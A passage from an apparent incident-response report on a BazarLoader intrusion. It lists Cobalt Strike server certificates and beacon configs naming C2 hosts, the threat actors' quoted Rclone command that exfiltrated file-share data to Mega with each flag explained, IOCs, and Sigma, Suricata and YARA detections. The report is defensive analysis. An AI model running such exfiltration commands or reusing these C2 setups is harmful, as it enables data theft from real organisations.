Certificate: [df:f6:ef:<span class="hljs-number">75</span>:f8:f5:c8:<span class="hljs-number">8</span>c:<span class="hljs-number">1</span>a:<span class="hljs-number">4</span>b:<span class="hljs-number">49</span>:fd:<span class="hljs-number">29</span>:<span class="hljs-number">99</span>:d8:<span class="hljs-number">58</span>:d0:<span class="hljs-number">9</span>c:<span class="hljs-number">17</span>:b0 ]
Not Before: <span class="hljs-number">2021</span>/<span class="hljs-number">07</span>/<span class="hljs-number">13</span> <span class="hljs-number">11</span>:<span class="hljs-number">58</span>:<span class="hljs-number">09</span> UTC 
Not After: <span class="hljs-number">2022</span>/<span class="hljs-number">07</span>/<span class="hljs-number">13</span> <span class="hljs-number">11</span>:<span class="hljs-number">58</span>:<span class="hljs-number">09</span> UTC 
Issuer Org: NN Fern 
Subject Common: forenzik.kz 
Subject Org: NN Fern 
Public Algorithm: rsaEncryption

<span class="hljs-number">3.101</span><span class="hljs-number">.57</span><span class="hljs-number">.185</span>:<span class="hljs-number">443</span>
JA3: <span class="hljs-number">72</span>a589da586844d7f0818ce684948eea
JA3s: e35df3e00ca4ef31d42b34bebaa2f86e
Certificate: [<span class="hljs-number">71</span>:<span class="hljs-number">9</span>c:ce:<span class="hljs-number">11</span>:b3:f0:ea:<span class="hljs-number">6f</span>:<span class="hljs-number">1</span>e:<span class="hljs-number">0f</span>:ff:<span class="hljs-number">0f</span>:b4:<span class="hljs-number">34</span>:ec:bb:<span class="hljs-number">6</span>c:aa:<span class="hljs-number">35</span>:<span class="hljs-number">40</span> ]
Not Before: <span class="hljs-number">2021</span>/<span class="hljs-number">07</span>/<span class="hljs-number">13</span> <span class="hljs-number">11</span>:<span class="hljs-number">58</span>:<span class="hljs-number">21</span> UTC 
Not After: <span class="hljs-number">2022</span>/<span class="hljs-number">07</span>/<span class="hljs-number">13</span> <span class="hljs-number">11</span>:<span class="hljs-number">58</span>:<span class="hljs-number">21</span> UTC 
Issuer Org: NN Fern Subject 
Common: forenzik.kz 
Subject Org: NN Fern 
Public Algorithm: rsaEncryption

<span class="hljs-number">54.177</span><span class="hljs-number">.153</span><span class="hljs-number">.230</span>:<span class="hljs-number">443</span>
JA3: <span class="hljs-number">72</span>a589da586844d7f0818ce684948eea
JA3s: e35df3e00ca4ef31d42b34bebaa2f86e
Certificate: [a1:ab:fe:d6:e4:<span class="hljs-number">5</span>a:<span class="hljs-number">23</span>:<span class="hljs-number">14</span>:dd:<span class="hljs-number">8</span>b:<span class="hljs-number">67</span>:<span class="hljs-number">54</span>:<span class="hljs-number">1</span>d:<span class="hljs-number">8</span>e:<span class="hljs-number">85</span>:b1:c6:<span class="hljs-number">10</span>:<span class="hljs-number">4</span>a:<span class="hljs-number">3f</span> ]
Not Before: <span class="hljs-number">2021</span>/<span class="hljs-number">07</span>/<span class="hljs-number">13</span> <span class="hljs-number">11</span>:<span class="hljs-number">58</span>:<span class="hljs-number">22</span> UTC 
Not After: <span class="hljs-number">2022</span>/<span class="hljs-number">07</span>/<span class="hljs-number">13</span> <span class="hljs-number">11</span>:<span class="hljs-number">58</span>:<span class="hljs-number">22</span> UTC 
Issuer Org: NN Fern 
Subject Common: forenzik.kz 
Subject Org: NN Fern 
Public Algorithm: rsaEncryption
</code></pre>
<p>Cobalt Strike:</p>
<p>yawero.com (45.153.240.234:443) This Cobalt Strike server was added to our <a href="https://thedfirreport.com/services/" target="_blank" rel="nofollow noopener">Threat Feed</a> on 07/19/2021.</p>
<pre><code>JA3: a0e9f5d64349fb13191bc781f81f42e1
JA3s: ae4edc6faf64d08308082ad26be60767
Certificate: [f7:<span class="hljs-number">1</span>b:<span class="hljs-number">37</span>:<span class="hljs-number">3f</span>:<span class="hljs-number">2</span>c:<span class="hljs-number">0</span>e:c4:<span class="hljs-number">3f</span>:dd:<span class="hljs-number">3</span>a:f5:dd:ad:<span class="hljs-number">39</span>:<span class="hljs-number">54</span>:b2:db:b4:c7:f3 ]
Not Before: <span class="hljs-number">2021</span>/<span class="hljs-number">06</span>/<span class="hljs-number">02</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> UTC 
Not After: <span class="hljs-number">2022</span>/<span class="hljs-number">06</span>/<span class="hljs-number">02</span> <span class="hljs-number">23</span>:<span class="hljs-number">59</span>:<span class="hljs-number">59</span> UTC 
Issuer Org: Sectigo Limited 
Subject Common: sazoya.com [sazoya.com ,www.sazoya.com ]
Public Algorithm: rsaEncryption
</code></pre>
<p>sazoya.com (23.106.160.77:443) This Cobalt Strike server was added to our <a href="https://thedfirreport.com/services/" target="_blank" rel="nofollow noopener">Threat Feed</a> on 07/29/2021.</p>
<pre><code>JA3: a0e9f5d64349fb13191bc781f81f42e1
JA3s: ae4edc6faf64d08308082ad26be60767
Certificate: [f7:<span class="hljs-number">1</span>b:<span class="hljs-number">37</span>:<span class="hljs-number">3f</span>:<span class="hljs-number">2</span>c:<span class="hljs-number">0</span>e:c4:<span class="hljs-number">3f</span>:dd:<span class="hljs-number">3</span>a:f5:dd:ad:<span class="hljs-number">39</span>:<span class="hljs-number">54</span>:b2:db:b4:c7:f3 ]
Not Before: <span class="hljs-number">2021</span>/<span class="hljs-number">06</span>/<span class="hljs-number">02</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> UTC 
Not After: <span class="hljs-number">2022</span>/<span class="hljs-number">06</span>/<span class="hljs-number">02</span> <span class="hljs-number">23</span>:<span class="hljs-number">59</span>:<span class="hljs-number">59</span> UTC 
Issuer Org: Sectigo Limited 
Subject Common: sazoya.com [sazoya.com ,www.sazoya.com ]
Public Algorithm: rsaEncryption
</code></pre>
<p>sazoya.com (192.198.86.130:443) This Cobalt Strike server was added to our <a href="https://thedfirreport.com/services/" target="_blank" rel="nofollow noopener">Threat Feed</a> on 07/29/2021. The IP appeared previously tied to a different domain on 05/11/2021.</p>
<pre><code>JA3: <span class="hljs-number">72</span>a589da586844d7f0818ce684948eea
JA3s: ae4edc6faf64d08308082ad26be60767
Certificate: [f7:<span class="hljs-number">1</span>b:<span class="hljs-number">37</span>:<span class="hljs-number">3f</span>:<span class="hljs-number">2</span>c:<span class="hljs-number">0</span>e:c4:<span class="hljs-number">3f</span>:dd:<span class="hljs-number">3</span>a:f5:dd:ad:<span class="hljs-number">39</span>:<span class="hljs-number">54</span>:b2:db:b4:c7:f3 ]
Not Before: <span class="hljs-number">2021</span>/<span class="hljs-number">06</span>/<span class="hljs-number">02</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> UTC 
Not After: <span class="hljs-number">2022</span>/<span class="hljs-number">06</span>/<span class="hljs-number">02</span> <span class="hljs-number">23</span>:<span class="hljs-number">59</span>:<span class="hljs-number">59</span> UTC 
Issuer Org: Sectigo Limited 
Subject Common: sazoya.com [sazoya.com ,www.sazoya.com ]
Public Algorithm: rsaEncryption
</code></pre>
<pre><code>{ 
    <span class="hljs-string">"x64"</span>: { 
        <span class="hljs-string">"md5"</span>: <span class="hljs-string">"9ea3a4b4bf64aeaefb60ada634f7fb43"</span>, 
        <span class="hljs-string">"sha1"</span>: <span class="hljs-string">"3e12312e43f4b84129023057862ee3934ca24c6d"</span>, 
        <span class="hljs-string">"time"</span>: <span class="hljs-number">1627455897000.6</span>, 
        <span class="hljs-string">"sha256"</span>: <span class="hljs-string">"43ecc44566a599a1f5d5b5063f27fd18b34e0dc67e053570e9ad944ad3f16024"</span>, 
        <span class="hljs-string">"config"</span>: { 
            <span class="hljs-string">"Spawn To x86"</span>: <span class="hljs-string">"<span class="hljs-variable">%windir</span><span class="hljs-variable">%\</span>\syswow64\\rundll32.exe"</span>, 
            <span class="hljs-string">"HTTP Method Path 2"</span>: <span class="hljs-string">"/ro"</span>, 
            <span class="hljs-string">"Jitter"</span>: <span class="hljs-number">14</span>, 
            <span class="hljs-string">"C2 Server"</span>: <span class="hljs-string">"yawero.com,/skin.js,sazoya.com,/skin.js,192.198.86.130,/skin.js"</span>, 
            <span class="hljs-string">"Method 1"</span>: <span class="hljs-string">"GET"</span>, 
            <span class="hljs-string">"Port"</span>: <span class="hljs-number">443</span>, 
            <span class="hljs-string">"Method 2"</span>: <span class="hljs-string">"POST"</span>, 
            <span class="hljs-string">"Polling"</span>: <span class="hljs-number">5000</span>, 
            <span class="hljs-string">"Spawn To x64"</span>: <span class="hljs-string">"<span class="hljs-variable">%windir</span><span class="hljs-variable">%\</span>\sysnative\\rundll32.exe"</span>, 
            <span class="hljs-string">"Watermark"</span>: <span class="hljs-number">1580103814</span>, 
            <span class="hljs-string">"Beacon Type"</span>: <span class="hljs-string">"8 (HTTPS)"</span>, 
            <span class="hljs-string">"C2 Host Header"</span>: <span class="hljs-string">""</span> 
        }, 
        <span class="hljs-string">"uri_queried"</span>: <span class="hljs-string">"/IMXo"</span> 
    }, 
    <span class="hljs-string">"x86"</span>: { 
        <span class="hljs-string">"md5"</span>: <span class="hljs-string">"d2bb4366b7018e0ed3e7f752fc312371"</span>, 
        <span class="hljs-string">"sha1"</span>: <span class="hljs-string">"0dfc5ef1947a29227d994a44f33c1b0fe12598ea"</span>, 
        <span class="hljs-string">"time"</span>: <span class="hljs-number">1627455891592.5</span>, 
        <span class="hljs-string">"sha256"</span>: <span class="hljs-string">"01b164f74bde4eb7c7da8c6cd707f23ce1923da49a3deb36aea5cd6e3030c0d6"</span>, 
        <span class="hljs-string">"config"</span>: { 
            <span class="hljs-string">"Spawn To x86"</span>: <span class="hljs-string">"<span class="hljs-variable">%windir</span><span class="hljs-variable">%\</span>\syswow64\\rundll32.exe"</span>, 
            <span class="hljs-string">"HTTP Method Path 2"</span>: <span class="hljs-string">"/groupcp"</span>, 
            <span class="hljs-string">"Jitter"</span>: <span class="hljs-number">14</span>, 
            <span class="hljs-string">"C2 Server"</span>: <span class="hljs-string">"yawero.com,/skin.js,sazoya.com,/skin.js,192.198.86.130,/skin.js”,v 
            "</span>Method <span class="hljs-number">1</span><span class="hljs-string">": "</span>GET<span class="hljs-string">", 
            "</span>Port<span class="hljs-string">": 443, 
            "</span>Method <span class="hljs-number">2</span><span class="hljs-string">": "</span>POST<span class="hljs-string">", 
            "</span>Polling<span class="hljs-string">": 5000, 
            "</span>Spawn To x64<span class="hljs-string">": "</span><span class="hljs-variable">%windir</span><span class="hljs-variable">%\</span>\sysnative\\rundll32.exe<span class="hljs-string">", 
            "</span>Watermark<span class="hljs-string">": 1580103814, 
            "</span>Beacon Type<span class="hljs-string">": "</span><span class="hljs-number">8</span> (HTTPS)<span class="hljs-string">", 
            "</span>C2 Host Header<span class="hljs-string">": "</span><span class="hljs-string">" 
        }, 
        "</span>uri_queried<span class="hljs-string">": "</span>/PJkW<span class="hljs-string">" 
    } 
} </span></code></pre>
<p>Cobalt Strike:</p>
<p>gojihu.com (23.106.215.61:443) This Cobalt Strike server was added to our <a href="https://thedfirreport.com/services/" target="_blank" rel="nofollow noopener">Threat Feed</a> on 07/19/2021.</p>
<pre><code>JA3: a0e9f5d64349fb13191bc781f81f42e1
JA3s: ae4edc6faf64d08308082ad26be60767
Certificate: [<span class="hljs-number">1f</span>:<span class="hljs-number">1</span>c:<span class="hljs-number">7</span>a:<span class="hljs-number">7</span>d:<span class="hljs-number">0</span>c:<span class="hljs-number">9</span>d:cd:dd:<span class="hljs-number">47</span>:<span class="hljs-number">2f</span>:a9:e5:ac:c8:ae:da:<span class="hljs-number">70</span>:<span class="hljs-number">29</span>:<span class="hljs-number">02</span>:<span class="hljs-number">81</span> ]
Not Before: <span class="hljs-number">2021</span>/<span class="hljs-number">07</span>/<span class="hljs-number">04</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> UTC 
Not After: <span class="hljs-number">2022</span>/<span class="hljs-number">07</span>/<span class="hljs-number">04</span> <span class="hljs-number">23</span>:<span class="hljs-number">59</span>:<span class="hljs-number">59</span> UTC 
Issuer Org: Sectigo Limited 
Subject Common: yuxicu.com [yuxicu.com ,www.yuxicu.com ]
Public Algorithm: rsaEncryption 
</code></pre>
<p>yuxicu.com (23.82.19.173:443) This Cobalt Strike server was added to our <a href="https://thedfirreport.com/services/" target="_blank" rel="nofollow noopener">Threat Feed</a> on 07/19/2021.</p>
<pre><code>JA3: a0e9f5d64349fb13191bc781f81f42e1
JA3s: ae4edc6faf64d08308082ad26be60767
Certificate: [<span class="hljs-number">1f</span>:<span class="hljs-number">1</span>c:<span class="hljs-number">7</span>a:<span class="hljs-number">7</span>d:<span class="hljs-number">0</span>c:<span class="hljs-number">9</span>d:cd:dd:<span class="hljs-number">47</span>:<span class="hljs-number">2f</span>:a9:e5:ac:c8:ae:da:<span class="hljs-number">70</span>:<span class="hljs-number">29</span>:<span class="hljs-number">02</span>:<span class="hljs-number">81</span> ]
Not Before: <span class="hljs-number">2021</span>/<span class="hljs-number">07</span>/<span class="hljs-number">04</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> UTC 
Not After: <span class="hljs-number">2022</span>/<span class="hljs-number">07</span>/<span class="hljs-number">04</span> <span class="hljs-number">23</span>:<span class="hljs-number">59</span>:<span class="hljs-number">59</span> UTC 
Issuer Org: Sectigo Limited 
Subject Common: yuxicu.com [yuxicu.com ,www.yuxicu.com ]
Public Algorithm: rsaEncryption 
</code></pre>
<pre><code>{ 
    "<span class="hljs-attribute">x86</span>": <span class="hljs-value">{ 
        "<span class="hljs-attribute">uri_queried</span>": <span class="hljs-string">"/HjIa"</span>, 
        "<span class="hljs-attribute">md5</span>": <span class="hljs-string">"742844254840eff409535494ae3ec338"</span>, 
        "<span class="hljs-attribute">config</span>": { 
            "<span class="hljs-attribute">Beacon Type</span>": <span class="hljs-string">"8 (HTTPS)"</span>, 
            "<span class="hljs-attribute">C2 Host Header</span>": <span class="hljs-string">""</span>, 
            "<span class="hljs-attribute">C2 Server</span>": <span class="hljs-string">"gojihu.com,/fam_cart.js,yuxicu.com,/fam_cart.js"</span>, 
            "<span class="hljs-attribute">HTTP Method Path 2</span>": <span class="hljs-string">"/case"</span>, 
            "<span class="hljs-attribute">Port</span>": <span class="hljs-number">443</span>, 
            "<span class="hljs-attribute">Method 1</span>": <span class="hljs-string">"GET"</span>, 
            "<span class="hljs-attribute">Spawn To x64</span>": <span class="hljs-string">"%windir%\\sysnative\\mstsc.exe"</span>, 
            "<span class="hljs-attribute">Method 2</span>": <span class="hljs-string">"POST"</span>, 
            "<span class="hljs-attribute">Spawn To x86</span>": <span class="hljs-string">"%windir%\\syswow64\\mstsc.exe"</span>, 
            "<span class="hljs-attribute">Polling</span>": <span class="hljs-number">5000</span>, 
            "<span class="hljs-attribute">Jitter</span>": <span class="hljs-number">32</span>, 
            "<span class="hljs-attribute">Watermark</span>": <span class="hljs-number">1580103814</span> 
        }, 
        "<span class="hljs-attribute">sha256</span>": <span class="hljs-string">"8c7e32178cf437f4fd3d7f706066831fce2cd9bc7e2050a3cefebab05952266d"</span>, 
        "<span class="hljs-attribute">time</span>": <span class="hljs-number">1627787111212.2</span>, 
        "<span class="hljs-attribute">sha1</span>": <span class="hljs-string">"46f33bb1c629cedb52fc5d7e46525ac5ccb13aaa"</span> 
    }</span>, 
    "<span class="hljs-attribute">x64</span>": <span class="hljs-value">{ 
        "<span class="hljs-attribute">uri_queried</span>": <span class="hljs-string">"/4Ovd"</span>, 
        "<span class="hljs-attribute">md5</span>": <span class="hljs-string">"1e788b5d1ff62688cfe5d2ef7832712a"</span>, 
        "<span class="hljs-attribute">config</span>": { 
            "<span class="hljs-attribute">Beacon Type</span>": <span class="hljs-string">"8 (HTTPS)"</span>, 
            "<span class="hljs-attribute">C2 Host Header</span>": <span class="hljs-string">""</span>, 
            "<span class="hljs-attribute">C2 Server</span>": <span class="hljs-string">"gojihu.com,/fam_cart.js,yuxicu.com,/fam_cart.js"</span>, 
            "<span class="hljs-attribute">HTTP Method Path 2</span>": <span class="hljs-string">"/case"</span>, 
            "<span class="hljs-attribute">Port</span>": <span class="hljs-number">443</span>, 
            "<span class="hljs-attribute">Method 1</span>": <span class="hljs-string">"GET"</span>, 
            "<span class="hljs-attribute">Spawn To x64</span>": <span class="hljs-string">"%windir%\\sysnative\\mstsc.exe"</span>, 
            "<span class="hljs-attribute">Method 2</span>": <span class="hljs-string">"POST"</span>, 
            "<span class="hljs-attribute">Spawn To x86</span>": <span class="hljs-string">"%windir%\\syswow64\\mstsc.exe"</span>, 
            "<span class="hljs-attribute">Polling</span>": <span class="hljs-number">5000</span>, 
            "<span class="hljs-attribute">Jitter</span>": <span class="hljs-number">32</span>, 
            "<span class="hljs-attribute">Watermark</span>": <span class="hljs-number">1580103814</span> 
        }, 
        "<span class="hljs-attribute">sha256</span>": <span class="hljs-string">"43ac1418825ccbe33ae34c64fd036f23ef066073e4fefa2a410b53922cfc815f"</span>, 
        "<span class="hljs-attribute">time</span>": <span class="hljs-number">1627787113671.1</span>, 
        "<span class="hljs-attribute">sha1</span>": <span class="hljs-string">"d4d88b60150088041fec4951335128031441bc5a"</span> 
    } 
</span>} 
</code></pre>
<h3 id="exfiltration">Exfiltration</h3>
<p>As the threat actors were perusing files, we received a notification that one of our files had been remotely opened from 46.38.235.14.</p>
<p>The threat actors later exfiltrated sensitive documents from domain joined file servers using the Rclone application. The destination of the exfiltrated data was Mega.io.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/09/Rclone-exec-1.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/09/Rclone-exec-1.png" alt="enter image description here" width="1256" height="105" /></a></p>
<p>The above command was copied and pasted by the threat actors to exfiltrate the data. Prior to the correct command, the threat actors accidentally pasted a command from a previous intrusion. That command contained a different victim organization in the arguments showing through out the intrusion continued sloppiness of the threat actor.</p>
<pre><code>rclone.exe copy--max-age <span class="hljs-number">3</span>y <span class="hljs-string">"\\&lt;redacted&gt;\C$\Shares"</span> remote: &lt;redacted&gt;\&lt;redacted&gt; --bwlimit <span class="hljs-number">2</span>M -q --ignore-existing --<span class="hljs-keyword">auto</span>-confirm --multi-thread-streams <span class="hljs-number">12</span> --transfers <span class="hljs-number">12</span> -P 
</code></pre>
<p>Breaking down the Rclone command line arguments:</p>
<pre><code><span class="hljs-deletion">- copy: Copy the source to the destination </span>
<span class="hljs-deletion">- --max-age: Only transfer files younger than &lt;time&gt; </span>
<span class="hljs-deletion">- \\&lt;redacted&gt;\C$\Shares": From source </span>
<span class="hljs-deletion">- remote: &lt;redacted&gt;\&lt;redacted&gt;: To destination folder </span>
<span class="hljs-deletion">- Bwlimit 2M: Bandwidth limit </span>
<span class="hljs-deletion">- -q: quiet </span>
<span class="hljs-deletion">- --ignore-existing: Skip all files that exist on destination </span>
<span class="hljs-deletion">- --auto-confirm: Do not request console confirmation </span>
<span class="hljs-deletion">- --multi-thread-streams: Max number of streams to use for multi-thread downloads </span>
<span class="hljs-deletion">- --transfers: Number of file transfers to run in parallel </span>
<span class="hljs-deletion">- -P: Show progress </span></code></pre>
<p>Reference:</p>
<pre><code><span class="hljs-attribute">https</span>:<span class="hljs-regexp">//</span>rclone.org<span class="hljs-regexp">/flags/</span> 
<span class="hljs-attribute">https</span>:<span class="hljs-regexp">//</span>rclone.org<span class="hljs-regexp">/commands/rclone_copy/</span></code></pre>
<p>A great reference for detecting Rclone data exfiltration is the article from nccgroup: <a href="https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/" target="_blank" rel="nofollow noopener">Detecting Rclone &#8211; An Effective Tool for Exfiltration</a> &#8211; and from Red Canary &#8211; <a href="https://redcanary.com/blog/rclone-mega-extortion/" target="_blank" rel="nofollow noopener">Transferring Leverage in a Ransomware Attack</a>.</p>
<h3 id="impact">Impact</h3>
<p>Multiple sensitive files were exfiltrated but before the threat actors could take any further action inside the network, they were evicted from the network. BazarLoader infections currently tend to materialize into <a href="https://thedfirreport.com/2021/09/13/bazarloader-to-conti-ransomware-in-32-hours/" target="_blank" rel="nofollow noopener">Conti ransomware</a>, and many of the TTP&#8217;s of the infection mimic the instructions from the leaked <a href="https://twitter.com/TheDFIRReport/status/1423361119926816776" target="_blank" rel="nofollow noopener">Conti manual</a>.</p>
<p>Information posted from <a href="https://twitter.com/altshiftprtscn?lang=en" target="_blank" rel="nofollow noopener">@AltShiftPrtScn</a> based on an IR engagement where the threat actors already had domain admin on the network two months prior meeting their final objectives.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/09/PeterM-ContiTTPs_tweet_1.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/09/PeterM-ContiTTPs_tweet_1.png" alt="enter image description here" width="1318" height="576" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/09/PeterM-ContiTTPs_tweet_2.png"><img loading="lazy" decoding="async" class="alignnone" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/09/PeterM-ContiTTPs_tweet_2.png" alt="enter image description here" width="1252" height="212" /></a></p>
<h3 id="iocs">IOCs</h3>
<h5 id="network">Network</h5>
<pre><code><span class="hljs-number">45.153</span><span class="hljs-number">.240</span><span class="hljs-number">.234</span>|<span class="hljs-number">443</span>
yawero.com
<span class="hljs-number">23.106</span><span class="hljs-number">.160</span><span class="hljs-number">.77</span>|<span class="hljs-number">443</span>
sazoya.com
<span class="hljs-number">192.198</span><span class="hljs-number">.86</span><span class="hljs-number">.130|443</span>
<span class="hljs-number">23.106</span><span class="hljs-number">.215</span><span class="hljs-number">.61|443
</span>gojihu.com
23.82.19.173:443
yuxicu.com
<span class="hljs-number">35.165</span><span class="hljs-number">.197</span><span class="hljs-number">.209</span>|<span class="hljs-number">443</span>
<span class="hljs-number">3.101</span><span class="hljs-number">.57</span><span class="hljs-number">.185</span>|<span class="hljs-number">443</span>
<span class="hljs-number">54.177</span><span class="hljs-number">.153</span><span class="hljs-number">.230</span>|<span class="hljs-number">443</span></code></pre>
<h5 id="file">File</h5>
<pre><code><span class="hljs-number">21.</span>dll
d6b773f8b88be82d4de015edbf0cc2fa
<span class="hljs-number">7461</span>eb3051102c76004cd58e55560044d3789d5c
<span class="hljs-number">96</span>a74d4c951d3de30dbdaadceee0956682a37fcbbc7005d2e3bbd270fbd17c98
<span class="hljs-number">21.</span>exe
<span class="hljs-number">362812f</span>dbc2dc2c5a2b214f223f12096
<span class="hljs-number">2</span>c4c4926b3b931d4628425b309a3357c63634fc9
<span class="hljs-number">972e38</span>f7fa4c3c59634155debb6fb32eebda3c0e8e73f4cb264463708d378c39
<span class="hljs-number">37</span>B.dll
d6b773f8b88be82d4de015edbf0cc2fa
7461eb3051102c76004cd58e55560044d3789d5c
96a74d4c951d3de30dbdaadceee0956682a37fcbbc7005d2e3bbd270fbd17c98
adf.bat
<span class="hljs-number">7645</span>b80c8627b0ba13ebc20491c82792
<span class="hljs-number">05</span>c43272a1d244413d0ef8595518b9c7601d3968
<span class="hljs-number">218e8</span>dc823e27a3baf3dcf48831562d488c2fa2c205286ea9af8a718b246b4cb
NtdsAudit.exe
<span class="hljs-number">1f</span>d930064b81e7c96eedb985ca2a0d97
<span class="hljs-number">39f</span>7e3f5435cdfacaa89aa5ef2d4e092bde4494e
fb49dce92f9a028a1da3045f705a574f3c1997fe947e2c69699b17f07e5a552b
ea3612919bf05b66e9a608bee742a422.dll
ea3612919bf05b66e9a608bee742a422
fd001fb71e9faa68c6e53162ed0554fd6f16a0e381aa280cea397b3d74bb62eb
</code></pre>
<h3 id="detections">Detections</h3>
<h5 id="network">Network</h5>
<pre><code>ET TROJAN Observed Malicious SSL Cert (BazaLoader CnC) 
ET MALWARE Observed Malicious SSL Cert (Bazar Backdoor) 
ET POLICY IP <span class="hljs-operator"><span class="hljs-keyword">Check</span> <span class="hljs-keyword">Domain</span> (myexternalip .com <span class="hljs-keyword">in</span> TLS SNI) 
ET <span class="hljs-keyword">POLICY</span> SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software) 
ET USER_AGENTS AnyDesk Remote Desktop Software <span class="hljs-keyword">User</span>-<span class="hljs-keyword">Agent</span> 
ET <span class="hljs-keyword">POLICY</span> <span class="hljs-keyword">HTTP</span> POST <span class="hljs-keyword">to</span> MEGA Userstorage </span></code></pre>
<h5 id="sigma">Sigma</h5>
<p>Detects execution of Net.exe, whether suspicious or benign &#8211; <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_net_execution.yml" target="_blank" rel="nofollow noopener">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_net_execution.yml</a></p>
<p>Suspicious AdFind Execution &#8211; <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_adfind.yml" target="_blank" rel="nofollow noopener">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_adfind.yml</a></p>
<p>AD Privileged Users or Groups Reconnaissance &#8211; <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_account_discovery.yml" target="_blank" rel="nofollow noopener">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_account_discovery.yml</a></p>
<p>Dridex Process Pattern &#8211; <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_malware_dridex.yml" target="_blank" rel="nofollow noopener">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_malware_dridex.yml</a></p>
<p>Domain Trust Discovery &#8211; <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_trust_discovery.yml" target="_blank" rel="nofollow noopener">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_trust_discovery.yml</a></p>
<p>Invocation of Active Directory Diagnostic Tool (ntdsutil.exe) &#8211; <a href="https://github.com/NVISOsecurity/sigma-public/blob/master/rules/windows/process_creation/win_susp_ntdsutil.yml" target="_blank" rel="nofollow noopener">https://github.com/NVISOsecurity/sigma-public/blob/master/rules/windows/process_creation/win_susp_ntdsutil.yml</a></p>
<p>Advanced IP Scanner &#8211; <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_advanced_ip_scanner.yml" target="_blank" rel="nofollow noopener">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_advanced_ip_scanner.yml</a></p>
<p>Local Accounts Discovery &#8211; <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_local_system_owner_account_discovery.yml" target="_blank" rel="nofollow noopener">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_local_system_owner_account_discovery.yml</a></p>
<p>Net.exe User Account Creation &#8211; <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_net_user_add.yml" target="_blank" rel="nofollow noopener">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_net_user_add.yml</a></p>
<p>Rundll32 Internet Connection &#8211; <a href="https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/network_connection/sysmon_rundll32_net_connections.yml" target="_blank" rel="nofollow noopener">https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/network_connection/sysmon_rundll32_net_connections.yml</a></p>
<p>Malicious PowerShell Commandlets &#8211; <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell_malicious_commandlets.yml" target="_blank" rel="nofollow noopener">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell_malicious_commandlets.yml</a></p>
<p>Suspicious Svchost Process &#8211; <a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_svchost.yml" target="_blank" rel="nofollow noopener">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_susp_svchost.yml</a></p>
<p>Rclone Execution via Command Line or PowerShell &#8211; <a href="https://gist.github.com/beardofbinary/fede0607e830aa1add8deda3d59d9a77#file-rclone_execution-yaml" target="_blank" rel="nofollow noopener">https://gist.github.com/beardofbinary/fede0607e830aa1add8deda3d59d9a77#file-rclone_execution-yaml</a></p>
<p>DNS Query for MEGA.io Upload Domain &#8211; <a href="https://gist.github.com/beardofbinary/d46c3b4e37ba8b21a79a63fbf69c6411#file-mega_dns_lookup-yaml" target="_blank" rel="nofollow noopener">https://gist.github.com/beardofbinary/d46c3b4e37ba8b21a79a63fbf69c6411#file-mega_dns_lookup-yaml</a></p>
<h5 id="yara">Yara</h5>
<pre><code>rule informational_AnyDesk_Remote_Software_Utility { 

   meta: 
      description = <span class="hljs-string">"files - AnyDesk.exe"</span> 
      author = <span class="hljs-string">"TheDFIRReport"</span> 
      date = <span class="hljs-string">"2021-07-25"</span> 
      hash1 = <span class="hljs-string">"9eab01396985ac8f5e09b74b527279a972471f4b97b94e0a76d7563cf27f4d57"</span> 
   strings: 
      <span class="hljs-variable">$x1</span> = <span class="hljs-string">"C:\\Buildbot\\ad-windows-32\\build\\release\\app-32\\win_loader\\AnyDesk.pdb"</span> fullword ascii 
      <span class="hljs-variable">$s2</span> = <span class="hljs-string">"release/win_6.3.x"</span> fullword ascii 
      <span class="hljs-variable">$s3</span> = <span class="hljs-string">"16eb5134181c482824cd5814c0efd636"</span> fullword ascii 
      <span class="hljs-variable">$s4</span> = <span class="hljs-string">"b1bfe2231dfa1fa4a46a50b4a6c67df34019e68a"</span> fullword ascii 
      <span class="hljs-variable">$s5</span> = <span class="hljs-string">"Z72.irZ"</span> fullword ascii 
      <span class="hljs-variable">$s6</span> = <span class="hljs-string">"ysN.JTf"</span> fullword ascii 
